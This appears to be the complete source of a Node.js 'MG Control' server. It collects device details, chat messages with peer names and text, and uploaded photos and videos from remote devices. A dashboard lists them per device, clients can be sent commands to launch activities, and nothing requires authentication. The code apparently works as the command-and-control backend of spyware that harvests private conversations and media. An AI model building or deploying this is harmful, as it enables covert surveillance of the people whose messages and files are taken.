import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "fs";
import path from "path";

const port = Number(process.env.PORT || 3000);

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
  console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
  process.exit(1);
}

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SECRET_KEY
);

// ============================================
// FILE UPLOAD CONFIG
// ============================================
const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

// ============================================
// FILE LOG HELPERS
// ============================================
function readLogs() {
  if (!fs.existsSync(LOG_FILE)) return [];
  try {
    const data = fs.readFileSync(LOG_FILE, "utf-8");
    return data.split("\n")
      .filter(Boolean)
      .map(line => {
        try { return JSON.parse(line); } catch { return null; }
      })
      .filter(Boolean);
  } catch {
    return [];
  }
}

function saveLog(entry) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(entry) + "\n");
  } catch {}
}

function removeFileLogEntries(fileName) {
  const logs = readLogs();
  const filtered = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
  fs.writeFileSync(LOG_FILE, filtered.map(e => JSON.stringify(e)).join("\n") + (filtered.length ? "\n" : ""));
}

function getFiles(deviceId) {
  return readLogs()
    .filter(entry => entry.type === "file")
    .filter(entry => !deviceId || entry.device_id === deviceId)
    .sort((a, b) => new Date(b.time) - new Date(a.time));
}

// ============================================
// COMMAND
// ============================================
let command = {
  title: "MG Menu",
  text: "Server online",
  action: "none",
  activity: ""
};

// ============================================
// HELPERS (existing)
// ============================================
function publicIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string" && forwarded) {
    return forwarded.split(",")[0].trim();
  }
  return req.socket.remoteAddress || "";
}

function clean(value) {
  return value == null ? "" : String(value);
}

function number(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : null;
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function ago(time) {
  const diff = Math.max(0, Date.now() - Number(time));
  if (diff < 60000) return Math.floor(diff / 1000) + "s ago";
  if (diff < 3600000) return Math.floor(diff / 60000) + "m ago";
  return Math.floor(diff / 3600000) + "h ago";
}

function formatDate(dateValue) {
  if (!dateValue) return "-";
  try {
    const d = new Date(dateValue);
    if (isNaN(d.getTime())) return "-";
    return d.toLocaleString("en-IN", { dateStyle: "medium", timeStyle: "short" });
  } catch { return "-"; }
}

function formatSize(bytes) {
  if (!bytes || bytes < 1) return "-";
  const units = ["B", "KB", "MB", "GB"];
  let i = 0;
  let size = bytes;
  while (size >= 1024 && i < units.length - 1) { size /= 1024; i++; }
  return size.toFixed(i > 0 ? 1 : 0) + " " + units[i];
}

function getFileType(fileName) {
  const ext = path.extname(fileName || "").toLowerCase();
  if ([".jpg", ".jpeg", ".png", ".gif", ".webp"].includes(ext)) return "image";
  if ([".mp4", ".webm", ".mov", ".mkv"].includes(ext)) return "video";
  return "file";
}

function isImage(fileName) { return getFileType(fileName) === "image"; }
function isVideo(fileName) { return getFileType(fileName) === "video"; }

// ============================================
// DASHBOARD RENDERER (Enhanced with file support)
// ============================================
async function renderDashboard() {
  const { data: deviceListData, error: deviceError } = await supabase
    .from("devices")
    .select("*")
    .order("server_last_seen", { ascending: false });

  if (deviceError) {
    console.error("Dashboard device error:", deviceError);
    return renderErrorPage("Unable to load devices from database.");
  }

  const deviceList = deviceListData || [];

  const { data: messageData, error: messageError } = await supabase
    .from("messages")
    .select("*")
    .order("message_time", { ascending: false })
    .limit(5000);

  if (messageError) {
    console.error("Dashboard message error:", messageError);
    return renderErrorPage("Unable to load messages from database.");
  }

  const allMessages = messageData || [];

  // file data
  const allFiles = getFiles();
  const fileCounts = {};
  for (const file of allFiles) {
    if (!fileCounts[file.device_id]) fileCounts[file.device_id] = 0;
    fileCounts[file.device_id]++;
  }

  // get the first device with messages, else first device
  const selectedId = deviceList.find(device =>
    allMessages.some(msg => msg.device_id === device.device_id)
  )?.device_id || deviceList[0]?.device_id || "";

  const selectedMessages = selectedId
    ? allMessages.filter(msg => msg.device_id === selectedId)
    : [];

  const selectedFiles = selectedId
    ? allFiles.filter(f => f.device_id === selectedId)
    : [];

  const totalMessages = allMessages.length;
  const totalFiles = allFiles.length;

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>MG Control</title>
  <style>
    :root{color-scheme:dark}
    body{margin:0;background:#080b10;color:#e8eef7;font-family:Inter,system-ui,-apple-system,Segoe UI,Arial,sans-serif}
    header{height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 18px;border-bottom:1px solid #1f2937;background:#0c111a}
    h1{font-size:16px;margin:0}
    small{color:#8b98a8}
    main{display:grid;grid-template-columns:320px 1fr;min-height:calc(100vh - 56px)}
    aside{border-right:1px solid #1f2937;background:#0c111a;padding:14px}
    section{padding:18px}
    .stat{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:14px}
    .box,.device,.panel{border:1px solid #1f2937;background:#101722;border-radius:10px}
    .box{padding:12px}
    .box b{font-size:20px}
    .device{display:block;width:100%;text-align:left;color:inherit;margin-bottom:10px;padding:12px;box-sizing:border-box;cursor:pointer;transition:background 0.2s}
    .device:hover{background:#1a2330}
    .device.active{background:#1e2a3a;border:1px solid #3b4a5c}
    .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px;background:#64748b}
    .on{background:#22c55e}
    .name{font-weight:700}
    .badge{background:#1f2937;padding:2px 8px;border-radius:12px;font-size:11px;color:#94a3b8;margin-left:6px}
    .meta{font-size:12px;color:#94a3b8;margin-top:5px}
    .panel{padding:14px;margin-bottom:14px}
    input,textarea,button{width:100%;box-sizing:border-box;border-radius:8px;border:1px solid #273449;background:#0b1018;color:#eef2f8;padding:10px;margin-top:8px}
    button{background:#e5e7eb;color:#111827;font-weight:700;cursor:pointer}
    .tabs{display:flex;gap:6px;margin-bottom:12px}
    .tab{padding:8px 16px;border-radius:8px 8px 0 0;border:1px solid transparent;border-bottom:none;background:transparent;color:#94a3b8;cursor:pointer}
    .tab.active{background:#101722;color:white;border-color:#1f2937}
    .tab-content{display:none}
    .tab-content.active{display:block}
    table{width:100%;border-collapse:collapse}
    .table{overflow:auto}
    th,td{text-align:left;border-bottom:1px solid #1f2937;padding:8px 10px;font-size:13px;vertical-align:top}
    th{color:#94a3b8;font-weight:600}
    .msg-in{color:#93c5fd}
    .msg-out{color:#86efac}
    .file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;margin-top:10px}
    .file-card{background:#0c111a;border:1px solid #1f2937;border-radius:8px;overflow:hidden;transition:transform 0.2s}
    .file-card:hover{transform:translateY(-2px);border-color:#3b4a5c}
    .file-thumb{height:120px;background:#080b10;display:flex;align-items:center;justify-content:center;font-size:48px;color:#94a3b8}
    .file-thumb img,.file-thumb video{width:100%;height:100%;object-fit:cover}
    .file-info{padding:10px}
    .file-name{font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .file-meta{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;justify-content:space-between}
    .file-actions{margin-top:6px;display:flex;gap:8px}
    .file-actions a,.file-actions button{color:#93c5fd;background:none;border:none;padding:0;font-size:12px;cursor:pointer}
    .file-actions .delete{color:#f87171}
    .empty{color:#64748b;padding:20px;text-align:center;border:1px dashed #293548;border-radius:8px}
    .error{border:1px solid #7f1d1d;background:#1c0b0b;color:#fecaca;padding:20px;border-radius:10px}
    .modal{position:fixed;inset:0;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;z-index:100}
    .modal.open{display:flex}
    .modal-box{background:#0c111a;border:1px solid #1f2937;border-radius:12px;max-width:90vw;max-height:90vh;overflow:auto}
    .modal-content{padding:16px}
    .modal-close{float:right;background:none;border:none;color:white;font-size:24px;cursor:pointer}
    @media(max-width:800px){main{grid-template-columns:1fr}aside{border-right:0;border-bottom:1px solid #1f2937}}
  </style>
</head>
<body>
<header>
  <div><h1>MG Control</h1><small>Chat + Device + File Upload</small></div>
  <small>${escapeHtml(new Date().toLocaleString())}</small>
</header>
<main>
<aside>
  <div class="stat">
    <div class="box"><small>Devices</small><br><b>${deviceList.length}</b></div>
    <div class="box"><small>Messages</small><br><b>${totalMessages}</b></div>
    <div class="box"><small>Files</small><br><b>${totalFiles}</b></div>
  </div>
  ${deviceList.map(device => `
    <div class="device ${device.device_id === selectedId ? 'active' : ''}" data-id="${escapeHtml(device.device_id)}">
      <div>
        <span class="dot ${Date.now() - Number(device.server_last_seen) < 60000 ? 'on' : ''}"></span>
        <span class="name">${escapeHtml(device.my_name || device.public_id || (device.my_uid ? 'UID ' + device.my_uid : device.device_id))}</span>
        <span class="badge">📁 ${fileCounts[device.device_id] || 0}</span>
      </div>
      <div class="meta">${escapeHtml(device.brand || '')} ${escapeHtml(device.model || '')} | ${escapeHtml(device.network_type || '')} | ${device.battery_percent ?? '?'}%</div>
      <div class="meta">${escapeHtml(device.public_ip || '')} | ${ago(device.server_last_seen)}</div>
    </div>
  `).join('')}
</aside>
<section>
  <div class="panel">
    <b>Menu Command</b>
    <form method="post" action="/panel/command">
      <textarea name="text" rows="2" placeholder="Status text">${escapeHtml(command.text)}</textarea>
      <input name="activity" placeholder="Activity class optional" value="${escapeHtml(command.activity)}">
      <button>Save command</button>
    </form>
  </div>
  <div class="panel">
    <div class="tabs">
      <button class="tab active" data-tab="messages">💬 Messages</button>
      <button class="tab" data-tab="files">📁 Files</button>
    </div>
    <div id="tab-messages" class="tab-content active">
      ${selectedMessages.length ? `
        <div class="table">
          <table>
            <thead><tr><th>Time</th><th>Peer</th><th>Dir</th><th>Text</th><th>MID</th></tr></thead>
            <tbody>
              ${selectedMessages.slice().reverse().slice(0, 200).map(m => `
                <tr>
                  <td>${escapeHtml(new Date(Number(m.message_time)).toLocaleString())}</td>
                  <td>${escapeHtml(m.peer_name || (m.peer_uid ? 'UID ' + m.peer_uid : ''))}</td>
                  <td class="${m.direction === 'out' ? 'msg-out' : 'msg-in'}">${escapeHtml(m.direction)}</td>
                  <td>${escapeHtml(m.text)}</td>
                  <td><small>${escapeHtml(m.mid)}</small></td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      ` : '<div class="empty">No messages for this device</div>'}
    </div>
    <div id="tab-files" class="tab-content">
      ${selectedFiles.length ? `
        <div class="file-grid">
          ${selectedFiles.map(f => {
            const url = '/uploads/' + encodeURIComponent(f.file);
            const thumb = isImage(f.file) ? `<img src="${url}" alt="${escapeHtml(f.original)}">` :
                         isVideo(f.file) ? `<video src="${url}" muted></video>` :
                         `<span>📄</span>`;
            return `
              <div class="file-card">
                <div class="file-thumb" onclick="previewFile('${escapeHtml(f.file)}')">${thumb}</div>
                <div class="file-info">
                  <div class="file-name" title="${escapeHtml(f.original)}">${escapeHtml(f.original)}</div>
                  <div class="file-meta">
                    <span>${formatSize(f.size)}</span>
                    <span>${escapeHtml(formatDate(f.time))}</span>
                  </div>
                  <div class="file-actions">
                    <a href="${url}" download>Download</a>
                    <a href="#" onclick="previewFile('${escapeHtml(f.file)}');return false;">Preview</a>
                    <button class="delete" onclick="deleteFile('${escapeHtml(f.file)}')">Delete</button>
                  </div>
                </div>
              </div>
            `;
          }).join('')}
        </div>
      ` : '<div class="empty">No files for this device</div>'}
    </div>
  </div>
</section>
</main>

<!-- Modal for file preview -->
<div id="fileModal" class="modal">
  <div class="modal-box">
    <div class="modal-content" id="fileModalContent">
      <button class="modal-close" onclick="closeModal()">&times;</button>
      <div id="filePreview"></div>
    </div>
  </div>
</div>

<script>
  // Device click
  document.querySelectorAll('.device').forEach(el => {
    el.addEventListener('click', function() {
      const id = this.dataset.id;
      window.location.href = '?device=' + encodeURIComponent(id);
    });
  });

  // Tab switching
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      this.classList.add('active');
      const target = this.dataset.tab;
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      document.getElementById('tab-' + target).classList.add('active');
    });
  });

  // Preview file
  function previewFile(fileName) {
    const url = '/uploads/' + encodeURIComponent(fileName);
    const modal = document.getElementById('fileModal');
    const preview = document.getElementById('filePreview');
    const ext = fileName.split('.').pop().toLowerCase();
    if (['jpg','jpeg','png','gif','webp'].includes(ext)) {
      preview.innerHTML = '<img src="' + url + '" style="max-width:100%;max-height:80vh;">';
    } else if (['mp4','webm','mov'].includes(ext)) {
      preview.innerHTML = '<video src="' + url + '" controls autoplay style="max-width:100%;max-height:80vh;"></video>';
    } else {
      preview.innerHTML = '<div style="padding:40px;text-align:center;font-size:48px;">📄</div><div style="text-align:center;">' + escapeHtml(fileName) + '</div>';
    }
    modal.classList.add('open');
  }

  function closeModal() {
    document.getElementById('fileModal').classList.remove('open');
  }
  // Close modal on backdrop click
  document.getElementById('fileModal').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
  });

  // Delete file
  async function deleteFile(fileName) {
    if (!confirm('Delete this file?')) return;
    try {
      const res = await fetch('/api/file/' + encodeURIComponent(fileName), { method: 'DELETE' });
      if (res.ok) {
        window.location.reload();
      } else {
        alert('Delete failed');
      }
    } catch(e) {
      alert('Error: ' + e.message);
    }
  }

  // Helper escapeHtml (for inline use)
  function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/[&<>"']/g, function(m) {
      if (m === '&') return '&amp;';
      if (m === '<') return '&lt;';
      if (m === '>') return '&gt;';
      if (m === '"') return '&quot;';
      if (m === "'") return '&#39;';
      return m;
    });
  }
</script>
</body>
</html>`;
}

function renderErrorPage(message) {
  return `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Error</title>
<style>body{margin:0;padding:30px;background:#080b10;color:#e8eef7;font-family:system-ui}.error{border:1px solid #7f1d1d;background:#1c0b0b;color:#fecaca;padding:20px;border-radius:10px}</style>
</head><body><div class="error">${escapeHtml(message)}</div></body></html>`;
}

// ============================================
// HTTP SERVER
// ============================================
const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);

    // ============================================
    // DASHBOARD
    // ============================================
    if (req.method === "GET" && url.pathname === "/") {
      return html(res, await renderDashboard());
    }

    // ============================================
    // COMMAND
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/data") {
      return json(res, command);
    }
    if (req.method === "POST" && url.pathname === "/panel/command") {
      const body = await readBody(req);
      command = {
        title: "MG Menu",
        text: String(body.text || "Server online"),
        action: body.activity ? "launch" : "none",
        activity: String(body.activity || "")
      };
      redirect(res, "/");
      return;
    }

    // ============================================
    // DEVICE HEARTBEAT (existing)
    // ============================================
    if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
      const body = await readBody(req);
      const deviceId = clean(body.deviceId);
      if (!deviceId) {
        return json(res, { ok: false, error: "deviceId required" }, 400);
      }
      const now = Date.now();
      const device = {
        device_id: deviceId,
        my_uid: number(body.myUid),
        public_id: clean(body.publicId),
        my_name: clean(body.myName),
        model: clean(body.model),
        brand: clean(body.brand),
        battery_percent: optionalNumber(body.batteryPercent),
        network_type: clean(body.networkType),
        public_ip: publicIp(req),
        client_last_seen: number(body.lastSeen) || now,
        server_last_seen: now,
        created_at: now
      };
      const { data: existingDevice, error: findError } = await supabase
        .from("devices")
        .select("created_at")
        .eq("device_id", deviceId)
        .maybeSingle();
      if (findError) {
        console.error("Device lookup error:", findError);
        return json(res, { ok: false, error: "database error" }, 500);
      }
      if (existingDevice?.created_at) {
        device.created_at = existingDevice.created_at;
      }
      const { error: deviceError } = await supabase
        .from("devices")
        .upsert(device, { onConflict: "device_id" });
      if (deviceError) {
        console.error("Device upsert error:", deviceError);
        return json(res, { ok: false, error: "database error" }, 500);
      }
      return json(res, { ok: true });
    }

    // ============================================
    // CHAT BATCH (existing)
    // ============================================
    if (req.method === "POST" && isChatBatchPath(url.pathname)) {
      const body = await readBody(req);
      const deviceId = clean(body.deviceId);
      if (!deviceId) {
        return json(res, { ok: false, error: "deviceId required" }, 400);
      }
      const list = Array.isArray(body.messages) ? body.messages.slice(0, 50) : [];
      if (!list.length) {
        return json(res, { ok: true, inserted: 0, skipped: 0 });
      }
      await ensureDevice(deviceId, body, req);
      const rows = [];
      let skipped = 0;
      for (const raw of list) {
        const mid = clean(raw.mid);
        if (!mid) { skipped++; continue; }
        rows.push({
          device_id: deviceId,
          mid,
          direction: raw.direction === "out" ? "out" : "in",
          peer_uid: number(raw.peerUid),
          peer_name: clean(raw.peerName),
          text: clean(raw.text).slice(0, 500),
          message_time: number(raw.time) || Date.now(),
          received_at: Date.now()
        });
      }
      if (!rows.length) {
        return json(res, { ok: true, inserted: 0, skipped });
      }
      const { data: insertedRows, error: messageError } = await supabase
        .from("messages")
        .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
        .select("device_id,mid");
      if (messageError) {
        console.error("Message insert error:", messageError);
        return json(res, { ok: false, error: "database error" }, 500);
      }
      const inserted = insertedRows?.length || 0;
      return json(res, {
        ok: true,
        inserted,
        skipped: skipped + (rows.length - inserted)
      });
    }

    // ============================================
    // FILE UPLOAD (RAW BINARY)
    // ============================================
    if (req.method === "POST" && url.pathname === "/upload") {
      const contentType = req.headers["content-type"] || "";
      const deviceId = url.searchParams.get("deviceId") || "unknown";
      const fileName = url.searchParams.get("name") || "file.bin";
      const cleanFileName = path.basename(fileName);

      if (contentType.includes("application/octet-stream") ||
          contentType.includes("image/jpeg") ||
          contentType.includes("image/png") ||
          contentType.includes("video/mp4")) {

        let buffer = Buffer.alloc(0);
        req.on("data", chunk => { buffer = Buffer.concat([buffer, chunk]); });
        req.on("end", () => {
          try {
            const safeName = `${Date.now()}_${cleanFileName}`;
            const filePath = path.join(UPLOAD_DIR, safeName);
            fs.writeFileSync(filePath, buffer);

            const thumbName = `thumb_${safeName}`;
            const thumbPath = path.join(THUMB_DIR, thumbName);
            fs.copyFileSync(filePath, thumbPath);

            saveLog({
              type: "file",
              file: safeName,
              original: cleanFileName,
              thumb: thumbName,
              device_id: deviceId,
              ip: publicIp(req),
              size: buffer.length,
              time: new Date().toISOString()
            });

            console.log(`[UPLOAD] ${publicIp(req)} | Device: ${deviceId} | ${cleanFileName} (${buffer.length} bytes)`);
            json(res, { ok: true, file: safeName, device_id: deviceId, message: "File uploaded" });
          } catch (err) {
            console.error("Upload error:", err);
            json(res, { ok: false, error: "Upload failed" }, 500);
          }
        });
        req.on("error", () => json(res, { ok: false, error: "Upload failed" }, 500));
        return;
      }
      return json(res, { ok: false, error: "Raw binary required" }, 400);
    }

    // ============================================
    // GET FILES FOR DEVICE (API)
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/files") {
      const deviceId = url.searchParams.get("deviceId");
      if (!deviceId) {
        return json(res, { ok: false, error: "deviceId required" }, 400);
      }
      const files = getFiles(deviceId);
      return json(res, { ok: true, files });
    }

    // ============================================
    // ALL FILES (API)
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/all-files") {
      const files = getFiles();
      return json(res, { ok: true, files });
    }

    // ============================================
    // DELETE FILE
    // ============================================
    if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
      const fileName = url.pathname.slice("/api/file/".length);
      if (!fileName) {
        return json(res, { ok: false, error: "fileName required" }, 400);
      }
      const filePath = path.join(UPLOAD_DIR, fileName);
      const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);
      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);
      removeFileLogEntries(fileName);
      return json(res, { ok: true, message: "File deleted" });
    }

    // ============================================
    // SERVE UPLOADS & THUMBS
    // ============================================
    if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
      const file = url.pathname.slice("/uploads/".length);
      const filePath = path.join(UPLOAD_DIR, file);
      if (!fs.existsSync(filePath)) return notFound(res);
      res.writeHead(200, {
        "Content-Type": "application/octet-stream",
        "Cache-Control": "no-cache"
      });
      fs.createReadStream(filePath).pipe(res);
      return;
    }
    if (req.method === "GET" && url.pathname.startsWith("/thumbs/")) {
      const file = url.pathname.slice("/thumbs/".length);
      const filePath = path.join(THUMB_DIR, file);
      if (!fs.existsSync(filePath)) return notFound(res);
      res.writeHead(200, {
        "Content-Type": "image/jpeg",
        "Cache-Control": "no-cache"
      });
      fs.createReadStream(filePath).pipe(res);
      return;
    }

    // ============================================
    // DEBUG API (existing + file info)
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/debug") {
      const [devicesResult, messagesResult] = await Promise.all([
        supabase.from("devices").select("*").order("server_last_seen", { ascending: false }),
        supabase.from("messages").select("*").order("message_time", { ascending: false }).limit(5000)
      ]);
      const files = getFiles();
      return json(res, {
        devices: devicesResult.data || [],
        messages: messagesResult.data || [],
        files: files
      });
    }

    // ============================================
    // FALLBACK 404
    // ============================================
    return json(res, { ok: false, error: "not found" }, 404);

  } catch (err) {
    console.error(err);
    return json(res, { ok: false, error: "server error" }, 500);
  }
});

server.listen(port, () => {
  console.log(`MG control server listening on ${port}`);
});

// ---------------------------------------------------------
// Helpers (existing)
// ---------------------------------------------------------

async function ensureDevice(deviceId, body, req) {
  const now = Date.now();
  const { data: existing, error: findError } = await supabase
    .from("devices")
    .select("created_at")
    .eq("device_id", deviceId)
    .maybeSingle();
  if (findError) {
    console.error("ensureDevice lookup error:", findError);
    return;
  }
  const device = {
    device_id: deviceId,
    my_uid: number(body.myUid),
    public_id: clean(body.publicId),
    my_name: "",
    model: "",
    brand: "",
    battery_percent: null,
    network_type: "",
    public_ip: publicIp(req),
    client_last_seen: now,
    server_last_seen: now,
    created_at: existing?.created_at || now
  };
  const { error } = await supabase
    .from("devices")
    .upsert(device, { onConflict: "device_id" });
  if (error) console.error("ensureDevice upsert error:", error);
}

function isHeartbeatPath(pathname) {
  return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat" || pathname === "/track";
}

function isChatBatchPath(pathname) {
  return pathname === "/api/chat/batch" || pathname === "/api/v1/chat/batch";
}

function notFound(res) {
  res.writeHead(404);
  res.end("Not found");
}

async function readBody(req) {
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString("utf8");
  if (!raw) return {};
  const type = req.headers["content-type"] || "";
  if (String(type).includes("application/x-www-form-urlencoded")) {
    return Object.fromEntries(new URLSearchParams(raw));
  }
  try { return JSON.parse(raw); } catch { return {}; }
}

function json(res, payload, status = 200) {
  const body = JSON.stringify(payload);
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(body);
}

function html(res, body) {
  res.writeHead(200, {
    "content-type": "text/html; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(body);
}

function redirect(res, location) {
  res.writeHead(302, { location });
  res.end();
}
